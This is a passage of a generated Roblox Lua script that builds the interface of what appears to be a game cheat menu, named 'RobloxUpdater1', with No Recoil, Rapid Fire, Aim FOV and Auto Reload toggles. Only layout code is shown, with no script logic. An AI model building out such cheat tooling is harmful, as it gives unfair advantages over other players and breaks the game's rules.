UI["4c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["4c"]["TextSize"] = 20
UI["4c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["4c"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["4c"]["BackgroundTransparency"] = 1
UI["4c"]["Size"] = UDim2.new(0, 236, 0, 36)
UI["4c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["4c"]["Text"] = [[The feature is currently in beta version.]]
UI["4c"]["Name"] = [[Ã¼berschrift]]
UI["4c"]["Position"] = UDim2.new(-0.19988, 0, -1.48, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.BetaWarnFrame.closebutton.Ã¼berschrift.2 text \\ --
UI["4d"] = Instance.new("TextLabel", UI["4c"])
UI["4d"]["BorderSizePixel"] = 0
UI["4d"]["TextTransparency"] = 0.32
UI["4d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["4d"]["TextSize"] = 20
UI["4d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["4d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["4d"]["BackgroundTransparency"] = 1
UI["4d"]["Size"] = UDim2.new(0, 235, 0, 41)
UI["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["4d"]["Text"] = [[Are you sure you want to continue?]]
UI["4d"]["Name"] = [[2 text]]
UI["4d"]["Position"] = UDim2.new(0.00479, 0, 0.68875, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.BetaWarnFrame.closebutton.Ã¼berschrift.2 text.UIGradient \\ --
UI["4e"] = Instance.new("UIGradient", UI["4d"])
UI["4e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(99, 255, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(99, 255, 0))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.BetaWarnFrame.closebutton.CloseScript \\ --
UI["4f"] = Instance.new("LocalScript", UI["48"])
UI["4f"]["Name"] = [[CloseScript]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods \\ --
UI["50"] = Instance.new("Frame", UI["e"])
UI["50"]["Visible"] = false
UI["50"]["BorderSizePixel"] = 0
UI["50"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27)
UI["50"]["Size"] = UDim2.new(0, 444, 0, 262)
UI["50"]["Position"] = UDim2.new(0.22573, 0, 0.15465, 0)
UI["50"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["50"]["Name"] = [[GunMods]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.UICorner \\ --
UI["51"] = Instance.new("UICorner", UI["50"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.Underline \\ --
UI["52"] = Instance.new("Frame", UI["50"])
UI["52"]["BorderSizePixel"] = 0
UI["52"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["52"]["Size"] = UDim2.new(0, 3, 0, -193)
UI["52"]["Position"] = UDim2.new(0.47297, 0, 0.94113, 0)
UI["52"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["52"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.TEXT \\ --
UI["53"] = Instance.new("TextLabel", UI["50"])
UI["53"]["BorderSizePixel"] = 0
UI["53"]["TextTransparency"] = 0.44
UI["53"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["53"]["TextSize"] = 28
UI["53"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["53"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["53"]["BackgroundTransparency"] = 1
UI["53"]["Size"] = UDim2.new(0, 423, 0, 28)
UI["53"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["53"]["Text"] = [[Gunmods Tab]]
UI["53"]["Name"] = [[TEXT]]
UI["53"]["Position"] = UDim2.new(0, 0, 0.03524, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.TEXT.UICorner \\ --
UI["54"] = Instance.new("UICorner", UI["53"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.TEXT.Underline \\ --
UI["55"] = Instance.new("Frame", UI["53"])
UI["55"]["BorderSizePixel"] = 0
UI["55"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["55"]["Size"] = UDim2.new(0, 199, 0, -2)
UI["55"]["Position"] = UDim2.new(0.26478, 0, 1.21429, 0)
UI["55"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["55"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.UIGradient \\ --
UI["56"] = Instance.new("UIGradient", UI["50"])
UI["56"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(78, 78, 78))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.NoRecoil \\ --
UI["57"] = Instance.new("TextButton", UI["50"])
UI["57"]["BorderSizePixel"] = 0
UI["57"]["TextSize"] = 35
UI["57"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["57"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["57"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["57"]["Size"] = UDim2.new(0, 204, 0, 46)
UI["57"]["BackgroundTransparency"] = 0.85
UI["57"]["Name"] = [[NoRecoil]]
UI["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["57"]["Text"] = [[No Recoil: OFF]]
UI["57"]["Position"] = UDim2.new(0.50991, 0, 0.62953, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.NoRecoil.UICorner \\ --
UI["58"] = Instance.new("UICorner", UI["57"])
UI["58"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.NoRecoil.UIStroke \\ --
UI["59"] = Instance.new("UIStroke", UI["57"])
UI["59"]["Transparency"] = 0.63
UI["59"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["59"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.NoRecoil.TextLabel 1 \\ --
UI["5a"] = Instance.new("TextLabel", UI["57"])
UI["5a"]["TextWrapped"] = true
UI["5a"]["BorderSizePixel"] = 0
UI["5a"]["TextTransparency"] = 0.32
UI["5a"]["TextScaled"] = true
UI["5a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["5a"]["TextSize"] = 74
UI["5a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["5a"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["5a"]["BackgroundTransparency"] = 1
UI["5a"]["Size"] = UDim2.new(0, 203, 0, 16)
UI["5a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["5a"]["Text"] = [[your weapon has no recoil]]
UI["5a"]["Name"] = [[TextLabel 1]]
UI["5a"]["Position"] = UDim2.new(-0, 0, 1.20311, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.NoRecoil.UIGradient \\ --
UI["5b"] = Instance.new("UIGradient", UI["57"])
UI["5b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.NoRecoil.Function \\ --
UI["5c"] = Instance.new("LocalScript", UI["57"])
UI["5c"]["Name"] = [[Function]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.NoRecoil.animation \\ --
UI["5d"] = Instance.new("LocalScript", UI["57"])
UI["5d"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.NoRecoil.Click Sound \\ --
UI["5e"] = Instance.new("LocalScript", UI["57"])
UI["5e"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.RapidFire \\ --
UI["5f"] = Instance.new("TextButton", UI["50"])
UI["5f"]["BorderSizePixel"] = 0
UI["5f"]["TextSize"] = 35
UI["5f"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["5f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["5f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["5f"]["Size"] = UDim2.new(0, 204, 0, 46)
UI["5f"]["BackgroundTransparency"] = 0.85
UI["5f"]["Name"] = [[RapidFire]]
UI["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["5f"]["Text"] = [[Rapid Fire: OFF]]
UI["5f"]["Position"] = UDim2.new(0.50991, 0, 0.25572, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.RapidFire.UICorner \\ --
UI["60"] = Instance.new("UICorner", UI["5f"])
UI["60"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.RapidFire.UIStroke \\ --
UI["61"] = Instance.new("UIStroke", UI["5f"])
UI["61"]["Transparency"] = 0.63
UI["61"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["61"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.RapidFire.TextLabel 1 \\ --
UI["62"] = Instance.new("TextLabel", UI["5f"])
UI["62"]["TextWrapped"] = true
UI["62"]["BorderSizePixel"] = 0
UI["62"]["TextTransparency"] = 0.32
UI["62"]["TextScaled"] = true
UI["62"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["62"]["TextSize"] = 74
UI["62"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["62"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["62"]["BackgroundTransparency"] = 1
UI["62"]["Size"] = UDim2.new(0, 204, 0, 16)
UI["62"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["62"]["Text"] = [[your weapons shoot faster]]
UI["62"]["Name"] = [[TextLabel 1]]
UI["62"]["Position"] = UDim2.new(-0, 0, 1.20311, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.RapidFire.UIGradient \\ --
UI["63"] = Instance.new("UIGradient", UI["5f"])
UI["63"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.RapidFire.animation \\ --
UI["64"] = Instance.new("LocalScript", UI["5f"])
UI["64"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.RapidFire.Click Sound \\ --
UI["65"] = Instance.new("LocalScript", UI["5f"])
UI["65"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.RapidFire.Function \\ --
UI["66"] = Instance.new("LocalScript", UI["5f"])
UI["66"]["Name"] = [[Function]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame \\ --
UI["67"] = Instance.new("ScrollingFrame", UI["50"])
UI["67"]["Active"] = true
UI["67"]["BorderSizePixel"] = 0
UI["67"]["CanvasSize"] = UDim2.new(0, 0, 1, 9)
UI["67"]["MidImage"] = [[rbxassetid://88305916544750]]
UI["67"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["67"]["HorizontalScrollBarInset"] = Enum.ScrollBarInset.Always
UI["67"]["Size"] = UDim2.new(0, 209, 0, 179)
UI["67"]["ScrollBarImageColor3"] = Color3.fromRGB(65, 215, 255)
UI["67"]["Position"] = UDim2.new(0, 0, 0.25572, 0)
UI["67"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["67"]["ScrollBarThickness"] = 5
UI["67"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.UIPadding \\ --
UI["68"] = Instance.new("UIPadding", UI["67"])
UI["68"]["PaddingTop"] = UDim.new(0, 3)
UI["68"]["PaddingLeft"] = UDim.new(0, 5)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AimFOV \\ --
UI["69"] = Instance.new("TextButton", UI["67"])
UI["69"]["BorderSizePixel"] = 0
UI["69"]["AutoButtonColor"] = false
UI["69"]["TextSize"] = 36
UI["69"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["69"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["69"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["69"]["Size"] = UDim2.new(0, 193, 0, 46)
UI["69"]["BackgroundTransparency"] = 0.85
UI["69"]["Name"] = [[AimFOV]]
UI["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["69"]["Text"] = [[Aim FOV: OFF]]
UI["69"]["Position"] = UDim2.new(-0.0402, 0, -0.0212, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AimFOV.UICorner \\ --
UI["6a"] = Instance.new("UICorner", UI["69"])
UI["6a"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AimFOV.UIStroke \\ --
UI["6b"] = Instance.new("UIStroke", UI["69"])
UI["6b"]["Transparency"] = 0.63
UI["6b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["6b"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AimFOV.UIGradient \\ --
UI["6c"] = Instance.new("UIGradient", UI["69"])
UI["6c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AimFOV.animation \\ --
UI["6d"] = Instance.new("LocalScript", UI["69"])
UI["6d"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AimFOV.Click Sound \\ --
UI["6e"] = Instance.new("LocalScript", UI["69"])
UI["6e"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AimFOV.Bool \\ --
UI["6f"] = Instance.new("BoolValue", UI["69"])
UI["6f"]["Name"] = [[Bool]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AimFOV.click to tp \\ --
UI["70"] = Instance.new("TextLabel", UI["69"])
UI["70"]["TextWrapped"] = true
UI["70"]["BorderSizePixel"] = 0
UI["70"]["TextTransparency"] = 0.32
UI["70"]["TextScaled"] = true
UI["70"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["70"]["TextSize"] = 74
UI["70"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["70"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["70"]["BackgroundTransparency"] = 1
UI["70"]["Size"] = UDim2.new(0, 193, 0, 17)
UI["70"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["70"]["Text"] = [[your view is then further]]
UI["70"]["Name"] = [[click to tp]]
UI["70"]["Position"] = UDim2.new(-0.00518, 0, 1.07749, 6)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AimFOV.Function \\ --
UI["71"] = Instance.new("LocalScript", UI["69"])
UI["71"]["Name"] = [[Function]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.SmallCrosshair \\ --
UI["72"] = Instance.new("TextButton", UI["67"])
UI["72"]["BorderSizePixel"] = 0
UI["72"]["TextSize"] = 35
UI["72"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["72"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["72"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["72"]["Size"] = UDim2.new(0, 192, 0, 46)
UI["72"]["BackgroundTransparency"] = 0.85
UI["72"]["Name"] = [[SmallCrosshair]]
UI["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["72"]["Text"] = [[Crosshair: 1]]
UI["72"]["Position"] = UDim2.new(-0.00554, 0, 0.19498, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.SmallCrosshair.UICorner \\ --
UI["73"] = Instance.new("UICorner", UI["72"])
UI["73"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.SmallCrosshair.UIStroke \\ --
UI["74"] = Instance.new("UIStroke", UI["72"])
UI["74"]["Transparency"] = 0.63
UI["74"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["74"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.SmallCrosshair.TextLabel 1 \\ --
UI["75"] = Instance.new("TextLabel", UI["72"])
UI["75"]["TextWrapped"] = true
UI["75"]["BorderSizePixel"] = 0
UI["75"]["TextTransparency"] = 0.32
UI["75"]["TextScaled"] = true
UI["75"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["75"]["TextSize"] = 74
UI["75"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["75"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["75"]["BackgroundTransparency"] = 1
UI["75"]["Size"] = UDim2.new(0, 193, 0, 16)
UI["75"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["75"]["Text"] = [[change your crosshair]]
UI["75"]["Name"] = [[TextLabel 1]]
UI["75"]["Position"] = UDim2.new(-0, 0, 1.20311, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.SmallCrosshair.UIGradient \\ --
UI["76"] = Instance.new("UIGradient", UI["72"])
UI["76"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.SmallCrosshair.animation \\ --
UI["77"] = Instance.new("LocalScript", UI["72"])
UI["77"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.SmallCrosshair.Click Sound \\ --
UI["78"] = Instance.new("LocalScript", UI["72"])
UI["78"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.SmallCrosshair.Function \\ --
UI["79"] = Instance.new("LocalScript", UI["72"])
UI["79"]["Name"] = [[Function]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.UIListLayout \\ --
UI["7a"] = Instance.new("UIListLayout", UI["67"])
UI["7a"]["Padding"] = UDim.new(0, 50)
UI["7a"]["SortOrder"] = Enum.SortOrder.LayoutOrder

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AutoReload \\ --
UI["7b"] = Instance.new("TextButton", UI["67"])
UI["7b"]["TextWrapped"] = true
UI["7b"]["BorderSizePixel"] = 0
UI["7b"]["TextSize"] = 35
UI["7b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["7b"]["TextScaled"] = true
UI["7b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["7b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["7b"]["Size"] = UDim2.new(0, 192, 0, 46)
UI["7b"]["BackgroundTransparency"] = 0.85
UI["7b"]["Name"] = [[AutoReload]]
UI["7b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["7b"]["Text"] = [[Auto Reload: OFF]]
UI["7b"]["Position"] = UDim2.new(-0.00554, 0, 0.19498, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AutoReload.UICorner \\ --
UI["7c"] = Instance.new("UICorner", UI["7b"])
UI["7c"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AutoReload.UIStroke \\ --
UI["7d"] = Instance.new("UIStroke", UI["7b"])
UI["7d"]["Transparency"] = 0.63
UI["7d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["7d"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AutoReload.TextLabel 1 \\ --
UI["7e"] = Instance.new("TextLabel", UI["7b"])
UI["7e"]["TextWrapped"] = true
UI["7e"]["BorderSizePixel"] = 0
UI["7e"]["TextTransparency"] = 0.32
UI["7e"]["TextScaled"] = true
UI["7e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["7e"]["TextSize"] = 74
UI["7e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["7e"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["7e"]["BackgroundTransparency"] = 1
UI["7e"]["Size"] = UDim2.new(0, 193, 0, 16)
UI["7e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["7e"]["Text"] = [[AutoRefills you guns if you are near the Refill Station]]
UI["7e"]["Name"] = [[TextLabel 1]]
UI["7e"]["Position"] = UDim2.new(-0, 0, 1.20311, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AutoReload.UIGradient \\ --
UI["7f"] = Instance.new("UIGradient", UI["7b"])
UI["7f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AutoReload.animation \\ --
UI["80"] = Instance.new("LocalScript", UI["7b"])
UI["80"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AutoReload.Click Sound \\ --
UI["81"] = Instance.new("LocalScript", UI["7b"])
UI["81"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AutoReload.Function \\ --
UI["82"] = Instance.new("LocalScript", UI["7b"])
UI["82"]["Name"] = [[Function]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.XUI \\ --
UI["83"] = Instance.new("Frame", UI["e"])
UI["83"]["Visible"] = false
UI["83"]["BorderSizePixel"] = 0
UI["83"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27)
UI["83"]["Size"] = UDim2.new(0, 444, 0, 262)
UI["83"]["Position"] = UDim2.new(0.225, 0, 0.15519, 0)
UI["83"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["83"]["Name"] = [[XUI]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.XUI.TEXT \\ --
UI["84"] = Instance.new("TextLabel", UI["83"])
UI["84"]["BorderSizePixel"] = 0
UI["84"]["TextTransparency"] = 0.44
UI["84"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["84"]["TextSize"] = 28
UI["84"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["84"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["84"]["BackgroundTransparency"] = 1
UI["84"]["Size"] = UDim2.new(0, 444, 0, 23)
UI["84"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["84"]["Text"] = [[Warning]]
UI["84"]["Name"] = [[TEXT]]
UI["84"]["Position"] = UDim2.new(0, 0, 0.05319, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.XUI.TEXT.UICorner \\ --
UI["85"] = Instance.new("UICorner", UI["84"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.XUI.TEXT.Underline \\ --
UI["86"] = Instance.new("Frame", UI["84"])
UI["86"]["BorderSizePixel"] = 0
UI["86"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["86"]["Size"] = UDim2.new(0, 199, 0, -2)
UI["86"]["Position"] = UDim2.new(0.27378, 0, 1.34472, 0)
UI["86"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["86"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.XUI.UICorner \\ --
UI["87"] = Instance.new("UICorner", UI["83"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.XUI.UIGradient \\ --
UI["88"] = Instance.new("UIGradient", UI["83"])
UI["88"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(78, 78, 78))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.XUI.closebutton \\ --
UI["89"] = Instance.new("TextButton", UI["83"])
UI["89"]["BorderSizePixel"] = 0
UI["89"]["TextSize"] = 20
UI["89"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["89"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["89"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["89"]["Size"] = UDim2.new(0, 168, 0, 50)
UI["89"]["BackgroundTransparency"] = 0.85
UI["89"]["Name"] = [[closebutton]]
UI["89"]["BorderColor3"] = Color3.fromRGB(255, 255, 255)
UI["89"]["Text"] = [[Close]]
UI["89"]["Position"] = UDim2.new(0.30657, 0, 0.5916, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.XUI.closebutton.UICorner \\ --
UI["8a"] = Instance.new("UICorner", UI["89"])
UI["8a"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.XUI.closebutton.UIGradient \\ --
UI["8b"] = Instance.new("UIGradient", UI["89"])
UI["8b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.XUI.closebutton.UIStroke \\ --
UI["8c"] = Instance.new("UIStroke", UI["89"])
UI["8c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["8c"]["Thickness"] = 1.5

-- // StarterGui.RobloxUpdater1.MainTab.Frames.XUI.closebutton.Ã¼berschrift \\ --
UI["8d"] = Instance.new("TextLabel", UI["89"])
UI["8d"]["BorderSizePixel"] = 0
UI["8d"]["TextTransparency"] = 0.51
UI["8d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["8d"]["TextSize"] = 20
UI["8d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["8d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["8d"]["BackgroundTransparency"] = 1
UI["8d"]["Size"] = UDim2.new(0, 236, 0, 36)
UI["8d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["8d"]["Text"] = [[Are you sure you want to close this script?]]
UI["8d"]["Name"] = [[Ã¼berschrift]]
UI["8d"]["Position"] = UDim2.new(-0.19988, 0, -1.48, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.XUI.closebutton.Ã¼berschrift.2 text \\ --
UI["8e"] = Instance.new("TextLabel", UI["8d"])
UI["8e"]["BorderSizePixel"] = 0
UI["8e"]["TextTransparency"] = 0.32
UI["8e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["8e"]["TextSize"] = 20
UI["8e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["8e"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["8e"]["BackgroundTransparency"] = 1
UI["8e"]["Size"] = UDim2.new(0, 235, 0, 41)
UI["8e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["8e"]["Text"] = [[Not all used functions are deactivated.]]
UI["8e"]["Name"] = [[2 text]]
UI["8e"]["Position"] = UDim2.new(0.00479, 0, 0.68875, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.XUI.closebutton.Ã¼berschrift.2 text.UIGradient \\ --
